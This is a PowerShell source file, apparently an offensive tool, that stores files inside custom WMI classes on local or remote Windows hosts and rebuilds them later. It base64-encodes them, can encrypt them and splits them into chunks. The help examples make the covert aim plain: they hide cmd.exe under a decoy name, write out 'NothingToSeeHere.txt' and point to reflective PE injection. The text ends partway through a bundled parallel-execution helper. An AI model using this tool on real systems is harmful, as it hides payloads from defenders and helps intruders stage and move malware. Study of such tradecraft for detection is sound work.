################################################################################
################################################################################
Function New-WMIMethodParameter {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
            [ValidateSet("In", "Out")]
            [String]$Direction,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [String]$Property,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [System.Management.CimType]$CimType
    )
     Return New-Object psobject -Property @{
        Direction = $Direction
        Property = $Property 
        CimType = $CimType
    }
}

################################################################################
################################################################################
Function local:Add-WMIProviderClassMethod {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class,
        [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
            [String]$MethodName,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object[]]$MethodInParameters,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object[]]$MethodOutParameters
    )
    Begin {
        $InParameters = New-Parameters -Direction In
        $OutParameters = New-Parameters -Direction Out
    } Process {
        $Index = 0
        $MethodInParameters | ForEach-Object {
            Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
            $Index++
        }
        $MethodOutParameters | ForEach-Object {
            Add-WMIProviderClassProperty -Parameters ([ref] $OutParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
            $Index++
        }
    } End {
       $InParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameter $InParameters
       $OutParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameter $OutParameters
       $null = $Class.Methods.Add($MethodName, $InParametersManagementBaseObjectInstance, $OutParametersManagementBaseObjectInstance)
       Write-Output $Class
    }
}


################################################################################
################################################################################
Function local:Add-WMIProviderClassProperty {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Parameter to add property to.")] 
            [Object][ref]$Parameters,
        [Parameter(Mandatory=$True, HelpMessage="Property to add.")] 
            [Object]$Property,
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [ValidateSet("In", "Out")] 
            [String]$Direction,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Int]$Index,
        [Parameter(Mandatory=$False, HelpMessage=".")] 
            [Object]$MappingStrings,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [System.Management.CimType]$CimType
    )
    $Parameters.Properties.Add($Property, $CimType, $false)
    $Parameters.Properties[$Property].Qualifiers.Add($Direction, $false)
    $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index, $false, $true, $false, $false)
    if ($MappingString)
    {
        $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
    }
}


################################################################################
################################################################################
Function local:New-WMIProviderClass {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [String]$ClassName,
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [String]$Target,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$Username,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$Password,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [SecureString]$SecurePassword,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [switch]$Dynamic
    )
    $ConnectionOptions = New-Object System.Management.ConnectionOptions;
    if ($Username)
    {
        if ($Password)
        {
            [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
        } 
        $ConnectionOptions.Username = $Username
        $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
    }
    else
    {
        $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
    }
    $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
    $Class = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null);

    $Guid = [System.Guid]::NewGuid()

    $Win32Provider = New-Object System.Management.ManagementClass("ROOT", "__Win32Provider", $null)
    $Class = $Win32Provider.Derive($ClassName)

    if ($Dynamic)
    {
        $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
    }
    # $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)
    $Class.Qualifiers.Add("SupportsCreate", $true)
    $Class.Qualifiers.Add("CreateBy", "Create")
    $Class.Qualifiers.Add("SupportsDelete", $true)
    $Class.Qualifiers.Add("DeleteBy", "DeleteInstance")
    $Class.Qualifiers.Add("Locale", 1033, $false, $true, $false, $true)
    $Class.Qualifiers.Add("UUID", "{$Guid}", $false, $true, $false, $true)
    return $Class
}

################################################################################
################################################################################
Function local:New-Parameters {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [ValidateSet("In", "Out")] 
            [String]$Direction
    )
    $__PARAMETERS = New-Object System.Management.ManagementClass("ROOT", "__PARAMETERS", $null)
    $Parameters = $__PARAMETERS.Clone()
    $Parameters.Qualifiers.Add($Direction, $false)
    return $Parameters
}

################################################################################
################################################################################
Function local:Get-ManagementBaseObject {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object]$Parameters
    )
    $TempPtr = [System.IntPtr]$Parameters
    $DotNetPath = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
    $SystemManagement = [System.Reflection.Assembly]::LoadFile($DotNetPath+"System.Management.dll")

    $IWbemClassObjectFreeThreaded = $SystemManagement.GetType(�System.Management.IWbemClassObjectFreeThreaded�)
    $IWbemClassObjectFreeThreaded_ctor = $IWbemClassObjectFreeThreaded.GetConstructors()[0]
    $IWbemClassObjectFreeThreadedInstance = $IWbemClassObjectFreeThreaded_ctor.Invoke($TempPtr)

    $ManagementBaseObject = $SystemManagement.GetType(�System.Management.ManagementBaseObject�)
    $ManagementBaseObject_ctor = $ManagementBaseObject.GetConstructors([Reflection.BindingFlags] "NonPublic, Instance")[1]
    $ManagementBaseObjectInstance = $ManagementBaseObject_ctor.Invoke($IWbemClassObjectFreeThreadedInstance)

    Return $ManagementBaseObjectInstance
}

################################################################################
# 
################################################################################
Function local:Invoke-ProviderSetup {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage=".")] 
            [String]$Provider = "WMI_extention",
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object]$Class,
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [ValidateSet ("NetworkServiceHost", "LocalSystemHostOrSelfHost", "LocalSystemHost", "Decoupled:COM")] 
            [String]$HostingModel = "NetworkServiceHost"
    )

    $Guid = [System.Guid]::NewGuid()

    $__Win32Provider = Set-WmiInstance -Class __Win32Provider -Arguments @{
        Name = $Provider;
        ClsId = "{$Guid}";
        ImpersonationLevel = 1;
        PerUserInitialization = "FALSE";
        HostingModel = $HostingModel;
    };

    $__InstanceProviderRegistration = Set-WmiInstance -Class __InstanceProviderRegistration -Arguments @{
        Provider = $__Win32Provider;
        SupportsGet = "TRUE";
        SupportsPut = "TRUE";
        SupportsDelete = "TRUE";
        SupportsEnumeration = "TRUE";
        QuerySupportLevels = [String[]]@("WQL:UnarySelect");
    };

    $__InstanceProviderRegistration = Set-WmiInstance -Class __MethodProviderRegistration -Arguments @{
        Provider = $__Win32Provider;
    };
}

################################################################################
# Create a new WMI Class
################################################################################
Function local:New-WMIFSClass {
<#
	.SYNOPSIS
	Creates a new WMI class to be used to store files
	.PARAMETER ClassName
	Name of class to create.
	.EXAMPLE
	New-WMIClass -ClassName WMIFS
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$Target=".",
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$Username,
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$Password,
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [SecureString]$SecurePassword
    )
    Begin {
        $ConnectionOptions = New-Object System.Management.ConnectionOptions;
        if ($Username)
        {
            Write-Verbose "Authenticating as $Username"
            if ($Password)
            {
                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
            } 
            $ConnectionOptions.Username = $Username
            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
        }
        else
        {
            Write-Verbose "Authenticating as $env:USERNAME"
            $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
        }

        $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
        $Class = New-Object System.Management.ManagementClass($Scope, [String]::Empty, $null);   
    } Process {
        $Class["__CLASS"] = $ClassName; 

        $Class.Qualifiers.Add("Static", $true)

        $Class.Properties.Add("FileStore", [System.Management.CimType]::String, $false)
        $Class.Properties["FileStore"].Qualifiers.Add("Key", $true)
        $Class.Properties["FileStore"].Qualifiers.Add("MaxLen", $([int32]::MaxValue - 1))

        $Class.Properties.Add("FileName", [System.Management.CimType]::String, $false)
        $Class.Properties["FileName"].Qualifiers.Add("Key", $true)

        $Class.Properties.Add("Index", [System.Management.CimType]::String, $false)
        $Class.Properties["Index"].Qualifiers.Add("Key", $true)
    } End {
        $Class.Put()
    }
}

################################################################################
# Convert the input file to Base64
# https://github.com/samratashok/nishang/blob/master/Utility/ExetoText.ps1
################################################################################
Function ConvertTo-Base64 {
<#
	.SYNOPSIS
	Converts a file to a Base64 encoded string by reading it in as raw bytes
	.PARAMETER FileName
	Path to the File to convert
	.EXAMPLE
	$EncodedText = ConvertTo-Base64 -FileName "cmd.exe" -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Path to File.")]
            [string]$FileName
    )
    Begin {
    } Process {
        Write-Verbose "Reading $FileName"
        #[byte[]]$File = Get-Content -Encoding Byte -Path $FileName
        [byte[]]$File = [System.IO.File]::ReadAllBytes($FileName)
        Write-Verbose "Encoding $FileName"
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($File)
        $EncodedText = [Convert]::ToBase64String($Bytes)
        Write-Verbose "Finished Encoding $FileName"
    } End {
        Write-Output $EncodedText
    }
}

################################################################################
################################################################################
Function Add-Entry {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$Index,
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$SubString
    )
    $object = New-Object PSObject -Property @{
        Index = New-Object System.String([String]::Empty);
        SubString = New-Object System.String([String]::Empty);
    }
    $object.Index = $Index;
    $object.SubString = $SubString;
    return $object;
}

################################################################################
# Insert the Base64 Encoded File into the WMI Class
################################################################################
Function Invoke-InsertFileThreaded {
<#
	.SYNOPSIS
	Slices a string into defined lengths and inserts it into a WMI class.
	.PARAMETER EncodedText
	The Base64 encoded text to insert.
	.PARAMETER FileName
	Name to identify the file in WMI. This value can be random.
	.PARAMETER ClassName
	Name of the WMI class to insert into.
	.EXAMPLE
	Invoke-InsertFile -EncodedText $EncodedText -FileName "definately_not_cmd.exe" -ClassName WMIFS -StrLen $length -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, 
            HelpMessage="Encoded Text to Insert",
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$true, HelpMessage="Name to identify the file in WMI.")]
            [string]$FileName,
        [Parameter(Mandatory=$true, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Allowed String Length")]
            [string]$StrLen = 8000,
        [Parameter(Mandatory=$false, HelpMessage="Encrypt the input file. This increase the file size by approximately 4x")]
            [switch]$Encrypt,
        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key")]
            [ValidateLength(16,16)]
            [string]$Key,
        [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
            [object]$Credential,
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$Target = "."
    )
    Begin {
        $index = 0
        if ($Encrypt) {
            #Rough estimate
            $StrLen /= 4.2
            $StrLen = [Math]::Floor($StrLen)
        }
        $SectionCount = [Math]::Ceiling($EncodedText.Length/$StrLen)
        $Sections = New-Object System.Collections.Generic.List[System.Management.Automation.PSObject]
    } Process {
        
        Write-Verbose "Creating Section 0 - $SectionCount" 

        For ($i = 0; $i -lt $EncodedText.Length; $i += $strlen) {
            if ($($i + $strlen) -le $EncodedText.Length) {
                [string]$substring = $EncodedText.Substring($i, $strlen)
            } else {
                [string]$substring = $EncodedText.Substring($i, $($EncodedText.Length - $i))
            }
            if ($Encrypt) {
                if ($key) {
                    $substring = ConvertTo-EncryptedText -PlaintextString $substring -Key $Key
                } else {
                    $substring = ConvertTo-EncryptedText -PlaintextString $substring
                }
            }
            $Sections.Add($(Add-Entry -Index $index -SubString $substring));
            $index++;
        }

        $ScriptBlock = {
            Write-Verbose ("Inserting Section: {0} ({1}...)" -f ($_.Index, $_.SubString.Substring(0,10)))
            $null = Set-WmiInstance -Class $ClassName -ComputerName $Target -Arguments @{
                FileStore = $_.SubString;
                FileName = $FileName; 
                Index = $_.Index;
            } -Credential $Credential
        }
        $Sections | Invoke-Parallel -ImportVariables -ScriptBlock $ScriptBlock
    } End {
    }
}

################################################################################
# Pull the file back from WMI
# (Less) Ugly Hack to get it working
# an ORDER BY would nice
################################################################################
Function Invoke-RetrieveFile {
<#
	.SYNOPSIS
	Retrieves a file from WMI identified by the FileName
	.PARAMETER FileName
	Name of the file in WMI.
	.PARAMETER ClassName
	Name of the WMI class to retrieve from.
	.EXAMPLE
	$File = Invoke-RetrieveFile -FileName "cmd.exe" -ClassName WMIFS -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$Target = ".",
        [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
            [object]$Credential,
        [Parameter(Mandatory=$true, HelpMessage="Name of File to Retrieve")]
            [string]$FileName,
        [Parameter(Mandatory=$false, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Decrypt the Retrieved File")]
            [switch]$Decrypt,
        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key")]
            [ValidateLength(16,16)]
            [string]$Key
    )
    Begin {
    } Process {
        $query = Get-WmiObject -Query "SELECT * FROM $ClassName WHERE FileName LIKE '$FileName'" -ComputerName $Target -Credential $Credential
        $stringBuilder = New-Object System.Text.StringBuilder
        $query | Select-Object @{Name='Index'; Expression={[int]$_.Index}},FileStore | Sort-Object Index | 
        ForEach-Object { 
            Write-Verbose ("Reading Section {0} ({1}...)" -f @($_.Index, $_.FileStore.SubString(0,10)))
            if ($Decrypt) {
                if ($key) {
                    $null = $stringBuilder.Append([String]$(ConvertFrom-EncryptedText -EncryptedString $_.FileStore -Key $Key))
                } else {
                    $null = $stringBuilder.Append([String]$(ConvertFrom-EncryptedText -EncryptedString $_.FileStore))
                }
            } else {
                $null = $stringBuilder.Append([String]$_.FileStore)
            }
        }
    } End {
        Write-Output $stringBuilder.ToString()
    }
}

################################################################################
# Covert the file back from Base64 to bytes
# https://github.com/samratashok/nishang/blob/master/Utility/TexttoExe.ps1
################################################################################
Function ConvertFrom-Base64 {
<#
	.SYNOPSIS
	Converts a File from Base64 back to raw bytes
	.PARAMETER EncodedText
	The Base64 encoded text to decode.
	.PARAMETER WriteToDisk
	Switch to write file back to disk
	.PARAMETER FileName
	Name of file to write out to.
	.EXAMPLE
	ConvertFrom-Base64 -EncodedText $EncodedText -WriteToDisk -FileName 'C:\calc.exe' -Verbose
	
	$File = ConvertFrom-Base64 -EncodedText $EncodedText -Verbose
	Set-Content -Path "NothingToSeeHere.txt" -Value $File -Encoding Byte
	Or consider using Invoke-ReflectivePEInjection here...
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Text to Decode",
            ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$false, HelpMessage="Name of File to Convert")]
            [switch]$WriteToDisk,
		[Parameter(Mandatory=$false, HelpMessage="Name of File to Write Out")]
            [string]$FileName = "NothingToSeeHere.txt"
    )
    Begin {
    } Process {
        Write-Verbose "Decoding File"
        $DecodedText = [System.Convert]::FromBase64String($EncodedText)
        Write-Verbose "Finished Decoding File"
        [byte[]]$Output = ([System.Text.Encoding]::Unicode.GetString($DecodedText)) -split ' '
    } End {
		if ($WriteToDisk) {
			Write-Verbose "Writing File to Disk as $FileName"
			Set-Content -Path $FileName -Value $Output -Encoding Byte
		} else {
			Write-Output $Output
		}
    }
}

################################################################################
# Encrypt the string before inserting
################################################################################
Function ConvertTo-EncryptedText{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="String of Text to Encrypt.")]
            [string]$PlaintextString,
        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key.")]
            [string]$Key
    )
    Begin {
        $SecureString = ConvertTo-SecureString -String $PlaintextString -AsPlainText -Force
    } Process {
        if ($key) {
            $EncryptedString = ConvertFrom-SecureString -SecureString $SecureString -Key $Key
        } else {
            $EncryptedString = ConvertFrom-SecureString -SecureString $SecureString
        }
    } End {
        $EncryptedString
    }
}

################################################################################
# Decrypt the string after retrieval
################################################################################
Function ConvertFrom-EncryptedText{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="String of Text to Decrypt.")]
            [string]$EncryptedString,
        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key")]
            [string]$Key
    )
    Begin {

    } Process {
        if ($key) {
            $SecureString = ConvertTo-SecureString -String $EncryptedString -Key $Key
        } else {
            $SecureString = ConvertTo-SecureString -String $EncryptedString
        }
        $PlaintextString = (New-Object System.Net.NetworkCredential([string]::Empty, $SecureString)).password
    } End {
        $PlaintextString
    }
}

function local:Invoke-Parallel {
    <#
    .SYNOPSIS
        Function to control parallel processing using runspaces
    .DESCRIPTION
        Function to control parallel processing using runspaces
            Note that each runspace will not have access to variables and commands loaded in your session or in other runspaces by default.
            This behaviour can be changed with parameters.
    .PARAMETER ScriptFile
        File to run against all input objects.  Must include parameter to take in the input object, or use $args.  Optionally, include parameter to take in parameter.  Example: C:\script.ps1
    .PARAMETER ScriptBlock
        Scriptblock to run against all computers.
        You may use $Using:<Variable> language in PowerShell 3 and later.
            The parameter block is added for you, allowing behaviour similar to foreach-object:
                Refer to the input object as $_.
                Refer to the parameter parameter as $parameter
    .PARAMETER InputObject
        Run script against these specified objects.
    .PARAMETER Parameter
        This object is passed to every script block.  You can use it to pass information to the script block; for example, the path to a logging folder
            Reference this object as $parameter if using the scriptblock parameterset.
    .PARAMETER ImportVariables
        If specified, get user session variables and add them to the initial session state
    .PARAMETER ImportModules
        If specified, get loaded modules and pssnapins, add them to the initial session state
    .PARAMETER Throttle
        Maximum number of threads to run at a single time.
    .PARAMETER SleepTimer
        Milliseconds to sleep after checking for completed runspaces and in a few other spots.  I would not recommend dropping below 200 or increasing above 500
    .PARAMETER RunspaceTimeout
        Maximum time in seconds a single thread can run.  If execution of your code takes longer than this, it is disposed.  Default: 0 (seconds)
        WARNING:  Using this parameter requires that maxQueue be set to throttle (it will be by default) for accurate timing.  Details here:
        http://gallery.technet.microsoft.com/Run-Parallel-Parallel-377fd430
    .PARAMETER NoCloseOnTimeout
        Do not dispose of timed out tasks or attempt to close the runspace if threads have timed out. This will prevent the script from hanging in certain situations where threads become non-responsive, at the expense of leaking memory within the PowerShell host.
    .PARAMETER MaxQueue
        Maximum number of powershell instances to add to runspace pool.  If this is higher than $throttle, $timeout will be inaccurate
        If this is equal or less than throttle, there will be a performance impact
        The default value is $throttle times 3, if $runspaceTimeout is not specified
        The default value is $throttle, if $runspaceTimeout is specified
    .PARAMETER LogFile
        Path to a file where we can log results, including run time for each thread, whether it completes, completes with errors, or times out.
    .PARAMETER AppendLog
        Append to existing log
    .PARAMETER Quiet
        Disable progress bar
    .EXAMPLE
        Each example uses Test-ForPacs.ps1 which includes the following code:
            param($computer)
            if(test-connection $computer -count 1 -quiet -BufferSize 16){
                $object = [pscustomobject] @{
                    Computer=$computer;
                    Available=1;
                    Kodak=$(
                        if((test-path "\\$computer\c$\users\public\desktop\Kodak Direct View Pacs.url") -or (test-path "\\$computer\c$\documents and settings\all users\desktop\Kodak Direct View Pacs.url") ){"1"}else{"0"}
                    )
                }
            }
            else{
                $object = [pscustomobject] @{
                    Computer=$computer;
                    Available=0;
                    Kodak="NA"
                }
            }
            $object
    .EXAMPLE
        Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject $(get-content C:\pcs.txt) -runspaceTimeout 10 -throttle 10
            Pulls list of PCs from C:\pcs.txt,
            Runs Test-ForPacs against each
            If any query takes longer than 10 seconds, it is disposed
            Only run 10 threads at a time
    .EXAMPLE
        Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject c-is-ts-91, c-is-ts-95
            Runs against c-is-ts-91, c-is-ts-95 (-computername)
            Runs Test-ForPacs against each
    .EXAMPLE
        $stuff = [pscustomobject] @{
            ContentFile = "windows\system32\drivers\etc\hosts"
            Logfile = "C:\temp\log.txt"
        }
        $computers | Invoke-Parallel -parameter $stuff {
            $contentFile = join-path "\\$_\c$" $parameter.contentfile
            Get-Content $contentFile |
                set-content $parameter.logfile
        }
        This example uses the parameter argument.  This parameter is a single object.  To pass multiple items into the script block, we create a custom object (using a PowerShell v3 language) with properties we want to pass in.
        Inside the script block, $parameter is used to reference this parameter object.  This example sets a content file, gets content from that file, and sets it to a predefined log file.
    .EXAMPLE
        $test = 5
        1..2 | Invoke-Parallel -ImportVariables {$_ * $test}
        Add variables from the current session to the session state.  Without -ImportVariables $Test would not be accessible
    .EXAMPLE
        $test = 5
        1..2 | Invoke-Parallel {$_ * $Using:test}
        Reference a variable from the current session with the $Using:<Variable> syntax.  Requires PowerShell 3 or later. Note that -ImportVariables parameter is no longer necessary.
    .FUNCTIONALITY
        PowerShell Language
    .NOTES
        Credit to Boe Prox for the base runspace code and $Using implementation
            http://learn-powershell.net/2012/05/10/speedy-network-information-query-using-powershell/
            http://gallery.technet.microsoft.com/scriptcenter/Speedy-Network-Information-5b1406fb#content
            https://github.com/proxb/PoshRSJob/
        Credit to T Bryce Yehl for the Quiet and NoCloseOnTimeout implementations
        Credit to Sergei Vorobev for the many ideas and contributions that have improved functionality, reliability, and ease of use
    .LINK
        https://github.com/RamblingCookieMonster/Invoke-Parallel
    #>
    [cmdletbinding(DefaultParameterSetName='ScriptBlock')]
    Param (
        [Parameter(Mandatory=$false,position=0,ParameterSetName='ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,

        [Parameter(Mandatory=$false,ParameterSetName='ScriptFile')]
        [ValidateScript({Test-Path $_ -pathtype leaf})]
        $ScriptFile,

        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,

        [PSObject]$Parameter,

        [switch]$ImportVariables,
        [switch]$ImportModules,
        [switch]$ImportFunctions,

        [int]$Throttle = 20,
        [int]$SleepTimer = 200,
        [int]$RunspaceTimeout = 0,
        [switch]$NoCloseOnTimeout = $false,
        [int]$MaxQueue,

        [validatescript({Test-Path (Split-Path $_ -parent)})]
        [switch] $AppendLog = $false,
        [string]$LogFile,

        [switch] $Quiet = $false
    )
    begin {
        #No max queue specified?  Estimate one.
        #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
        if( -not $PSBoundParameters.ContainsKey('MaxQueue') ) {
            if($RunspaceTimeout -ne 0){ $script:MaxQueue = $Throttle }
            else{ $script:MaxQueue = $Throttle * 3 }
        }
        else {
            $script:MaxQueue = $MaxQueue
        }
        #Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue' logFile '$logFile'"

        #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
        if ($ImportVariables -or $ImportModules -or $ImportFunctions) {
            $StandardUserEnv = [powershell]::Create().addscript({

                #Get modules, snapins, functions in this clean runspace
                $Modules = Get-Module | Select-Object -ExpandProperty Name
                $Snapins = Get-PSSnapin | Select-Object -ExpandProperty Name
                $Functions = Get-ChildItem function:\ | Select-Object -ExpandProperty Name

                #Get variables in this clean runspace
                #Called last to get vars like $? into session
                $Variables = Get-Variable | Select-Object -ExpandProperty Name

                #Return a hashtable where we can access each.
                @{
                    Variables   = $Variables
                    Modules     = $Modules
                    Snapins     = $Snapins
                    Functions   = $Functions
                }
            }).invoke()[0]

            if ($ImportVariables) {
                #Exclude common parameters, bound parameters, and automatic variables
                Function _temp {[cmdletbinding(SupportsShouldProcess=$True)] param() }
                $VariablesToExclude = @( (Get-Command _temp | Select-Object -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                #Write-Verbose "Excluding variables $( ($VariablesToExclude | Sort-Object ) -join ", ")"

                # we don't use 'Get-Variable -Exclude', because it uses regexps.
                # One of the veriables that we pass is '$?'.
                # There could be other variables with such problems.
                # Scope 2 required if we move to a real module
                $UserVariables = @( Get-Variable | Where-Object { -not ($VariablesToExclude -contains $_.Name) } )
                #Write-Verbose "Found variables to import: $( ($UserVariables | Select-Object -expandproperty Name | Sort-Object ) -join ", " | Out-String).`n"
            }
            if ($ImportModules) {
                $UserModules = @( Get-Module | Where-Object {$StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path $_.Path -ErrorAction SilentlyContinue)} | Select-Object -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin | Select-Object -ExpandProperty Name | Where-Object {$StandardUserEnv.Snapins -notcontains $_ } )
            }
            if($ImportFunctions) {
                $UserFunctions = @( Get-ChildItem function:\ | Where-Object { $StandardUserEnv.Functions -notcontains $_.Name } )
            }
        }

        #region functions
            Function Get-RunspaceData {
                [cmdletbinding()]
                param( [switch]$Wait )
                #loop through runspaces
                #if $wait is specified, keep looping until all complete
                Do {
                    #set more to false for tracking completion
                    $more = $false

                    #Progress bar if we have inputobject count (bound parameter)
                    if (-not $Quiet) {
                        Write-Progress  -Activity "Running Query" -Status "Starting threads"`
                            -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
                            -PercentComplete $( Try { $script:completedCount / $totalCount * 100 } Catch {0} )
                    }

                    #run through each runspace.
                    Foreach($runspace in $runspaces) {

                        #get the duration - inaccurate
                        $currentdate = Get-Date
                        $runtime = $currentdate - $runspace.startTime
                        $runMin = [math]::Round( $runtime.totalminutes ,2 )

                        #set up log object
                        $log = "" | Select-Object Date, Action, Runtime, Status, Details
                        $log.Action = "Removing:'$($runspace.object)'"
                        $log.Date = $currentdate
                        $log.Runtime = "$runMin minutes"

                        #If runspace completed, end invoke, dispose, recycle, counter++
                        If ($runspace.Runspace.isCompleted) {

                            $script:completedCount++

                            #check if there were errors
                            if($runspace.powershell.Streams.Error.Count -gt 0) {
                                #set the logging info and move the file to completed
                                $log.status = "CompletedWithErrors"
                                #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                                foreach($ErrorRecord in $runspace.powershell.Streams.Error) {
                                    Write-Error -ErrorRecord $ErrorRecord
                                }
                            }
                            else {
                                #add logging details and cleanup
                                $log.status = "Completed"
                                #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            }

                            #everything is logged, clean up the runspace
                            $runspace.powershell.EndInvoke($runspace.Runspace)
                            $runspace.powershell.dispose()
                            $runspace.Runspace = $null
                            $runspace.powershell = $null
                        }
                        #If runtime exceeds max, dispose the runspace
                        ElseIf ( $runspaceTimeout -ne 0 -and $runtime.totalseconds -gt $runspaceTimeout) {
                            $script:completedCount++
                            $timedOutTasks = $true

                            #add logging details and cleanup
                            $log.status = "TimedOut"
                            Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            Write-Error "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | out-string)"

                            #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                            if (!$noCloseOnTimeout) { $runspace.powershell.dispose() }
                            $runspace.Runspace = $null
                            $runspace.powershell = $null
                            $completedCount++
                        }

                        #If runspace isn't null set more to true
                        ElseIf ($runspace.Runspace -ne $null ) {
                            $log = $null
                            $more = $true
                        }

                        #log the results if a log file was indicated
                        if($logFile -and $log) {
                            ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1] | out-file $LogFile -append
                        }
                    }

                    #Clean out unused runspace jobs
                    $temphash = $runspaces.clone()
                    $temphash | Where-Object { $_.runspace -eq $Null } | ForEach-Object {
                        $Runspaces.remove($_)
                    }

                    #sleep for a bit if we will loop again
                    if($PSBoundParameters['Wait']){ Start-Sleep -milliseconds $SleepTimer }

                #Loop again only if -wait parameter and there are more runspaces to process
                } while ($more -and $PSBoundParameters['Wait'])

            #End of runspace function
            }
        #endregion functions

        #region Init

            if($PSCmdlet.ParameterSetName -eq 'ScriptFile') {
                $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | out-string) )
            }
            elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock') {
                #Start building parameter names for the param block
                [string[]]$ParamsToAdd = '$_'
                if( $PSBoundParameters.ContainsKey('Parameter') ) {
                    $ParamsToAdd += '$Parameter'
                }

                $UsingVariableData = $Null

                # This code enables $Using support through the AST.
                # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!

